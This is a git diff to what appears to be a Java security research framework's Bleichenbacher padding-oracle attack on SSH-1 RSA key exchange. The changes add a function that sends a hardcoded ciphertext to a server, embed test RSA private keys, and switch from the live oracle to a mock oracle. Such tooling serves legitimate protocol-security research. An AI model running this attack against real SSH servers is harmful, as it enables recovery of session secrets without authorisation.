@@ -15,19 +15,27 @@ import de.rub.nds.sshattacker.attacks.config.BleichenbacherCommandConfig;
 import de.rub.nds.sshattacker.attacks.general.KeyFetcher;
 import de.rub.nds.sshattacker.attacks.general.ParallelExecutor;
 import de.rub.nds.sshattacker.attacks.pkcs1.*;
-import de.rub.nds.sshattacker.attacks.pkcs1.oracles.BleichenbacherOracle;
+import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Ssh1MockOracle;
 import de.rub.nds.sshattacker.attacks.response.EqualityError;
 import de.rub.nds.sshattacker.core.config.Config;
 import de.rub.nds.sshattacker.core.constants.KeyExchangeAlgorithm;
 import de.rub.nds.sshattacker.core.crypto.cipher.AbstractCipher;
 import de.rub.nds.sshattacker.core.crypto.cipher.CipherFactory;
+import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPrivateKey;
 import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
 import de.rub.nds.sshattacker.core.exceptions.ConfigurationException;
 import de.rub.nds.sshattacker.core.exceptions.CryptoException;
+import de.rub.nds.sshattacker.core.protocol.common.ProtocolMessage;
+import de.rub.nds.sshattacker.core.state.State;
+import de.rub.nds.sshattacker.core.workflow.DefaultWorkflowExecutor;
+import de.rub.nds.sshattacker.core.workflow.WorkflowExecutor;
+import de.rub.nds.sshattacker.core.workflow.WorkflowTrace;
+import de.rub.nds.sshattacker.core.workflow.action.GenericReceiveAction;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.math.BigInteger;
+import java.security.InvalidKeyException;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.security.interfaces.RSAPublicKey;
@@ -35,6 +43,7 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Random;
+import javax.crypto.NoSuchPaddingException;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -144,8 +153,32 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
         LOGGER.info("Recived keys");
     }
 
+    private String sendSinglePacket(byte[] msg) {
+
+        Config sshConfig = getSshConfig();
+        sshConfig.setWorkflowExecutorShouldClose(false);
+        WorkflowTrace trace = BleichenbacherWorkflowGenerator.generateWorkflow(sshConfig, msg);
+
+        GenericReceiveAction receiveOracleResultAction = new GenericReceiveAction();
+        trace.addSshAction(receiveOracleResultAction);
+
+        State state = new State(sshConfig, trace);
+        WorkflowExecutor workflowExecutor = new DefaultWorkflowExecutor(state);
+        workflowExecutor.executeWorkflow();
+
+        ProtocolMessage<?> lastMessage = receiveOracleResultAction.getReceivedMessages().get(0);
+        LOGGER.debug("Received: {}", lastMessage.toString());
+        System.exit(0);
+        return lastMessage.toString();
+    }
+
     @Override
     public void executeAttack() {
+        byte[] msg = new byte[100];
+        msg =
+                ArrayConverter.hexStringToByteArray(
+                        "12CE7501BDDC7AF798644ACB351A37A90F31FB0E0CF0D9C18BE14FAB0CF0F4F42689F13C06370A477E764E0CA64DEC2F7A12ABFFBDE3058901D9A3CC453B72C7BEB059BAF394F642A0EE5AE5D4AC6BA775C23E9ADBE5338E8896AB521525979C98AC993C5F5C8F1D35DEA7EBD22BB485E925B8E50C9258C00673B96733F29D16");
+        LOGGER.info(sendSinglePacket(msg));
 
         if (config.isBenchmark()) {
             try {
@@ -160,6 +193,38 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
                 throw new RuntimeException(e);
             }
         }
+
+        // Test
+        // Host 2048
+        CustomRsaPrivateKey hostPrivatKey =
+                new CustomRsaPrivateKey(
+                        new BigInteger(
+                                "36BDABD4DC5CE64FAF60420BE9DB5D534CB1A5D7E4BE3BC455B71907EE5C9B69F6DCA7D326DFFD352E11BE3A02BFF5F801F97C54A813D373EE23D86374C4D5F010C2A964FF2945B3D988B1337B713F5831DA28C30D3A5986DAF6E7F7E4F4775957A3CBFBAEAE84E3A0A2AFE1D59C293903D2B39852C82AEB7B23ED0704D1FE69",
+                                16),
+                        new BigInteger(
+                                "AB81705A90C69618E388795B521C2353E7E0B37B133D7780593C068C3E39D5D57CD67F07E3D76B3EF8213E2494732579223644A88CE48E5A3D6EEF208B20CEA5F50A99D42B0A915C765654175D35C9BC4DBC4432B499D890ED79315BAB7B3485595154A87F2F040B8ACC654A93A9C51F418163BDB3A2D57A092F7FBC10B4BF1D",
+                                16));
+        CustomRsaPublicKey hostPublicKey =
+                new CustomRsaPublicKey(
+                        new BigInteger("010001", 16),
+                        new BigInteger(
+                                "AB81705A90C69618E388795B521C2353E7E0B37B133D7780593C068C3E39D5D57CD67F07E3D76B3EF8213E2494732579223644A88CE48E5A3D6EEF208B20CEA5F50A99D42B0A915C765654175D35C9BC4DBC4432B499D890ED79315BAB7B3485595154A87F2F040B8ACC654A93A9C51F418163BDB3A2D57A092F7FBC10B4BF1D",
+                                16));
+        // Server 1024
+        CustomRsaPrivateKey serverPrivateKey =
+                new CustomRsaPrivateKey(
+                        new BigInteger(
+                                "ABE6304FAE535001BBFA94474FA4178C012058518A93805A25EFD56932C365724B422CDE3EE038243367AE3C57876CE297E66531B2F027B1407DE77758200761FFE5F96360BE21DDB7ECAD61523319A8DAA65B5F00CF52F0DB2F3A2A929EDA11",
+                                16),
+                        new BigInteger(
+                                "CC8E8480EB2E26580EA260146575CB10D215F71A46BBB62C98D854154579E372E193102FF359799C4D247A661F32C082EE5C1919B43889214C8310E6291E2B0B16818464BAE5A0374CACA0EB4814756B71C3E1F459AB4B8DE555D338CA30557F",
+                                16));
+        CustomRsaPublicKey serverPublicKey =
+                new CustomRsaPublicKey(
+                        new BigInteger("010001", 16),
+                        new BigInteger(
+                                "CC8E8480EB2E26580EA260146575CB10D215F71A46BBB62C98D854154579E372E193102FF359799C4D247A661F32C082EE5C1919B43889214C8310E6291E2B0B16818464BAE5A0374CACA0EB4814756B71C3E1F459AB4B8DE555D338CA30557F",
+                                16));
 
         /*// Host 2048
         CustomRsaPrivateKey hostPrivatKey =
@@ -365,23 +430,22 @@ public class BleichenbacherAttacker extends Attacker<BleichenbacherCommandConfig
             throw new RuntimeException(e);
         }
 
-        /*        Ssh1MockOracle oracle = null;
+        Ssh1MockOracle oracle = null;
         try {
             oracle =
                     new Ssh1MockOracle(
                             hostPublicKey, hostPrivatKey, serverPublicKey, serverPrivateKey);
         } catch (NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException e) {
             throw new RuntimeException(e);
-        }*/
+        }
 
-        BleichenbacherOracle oracle =
-                new BleichenbacherOracle(
-                        this.hostPublicKey,
-                        this.serverPublicKey,
-                        getSshConfig(),
-                        counterInnerBleichenbacher,
-                        counterOuterBleichenbacher);
-
+        /*        BleichenbacherOracle oracle =
+        new BleichenbacherOracle(
+                this.hostPublicKey,
+                this.serverPublicKey,
+                getSshConfig(),
+                counterInnerBleichenbacher,
+                counterOuterBleichenbacher);*/
         Bleichenbacher attacker =
                 new Bleichenbacher(encryptedSecret, oracle, hostPublicKey, serverPublicKey);
 
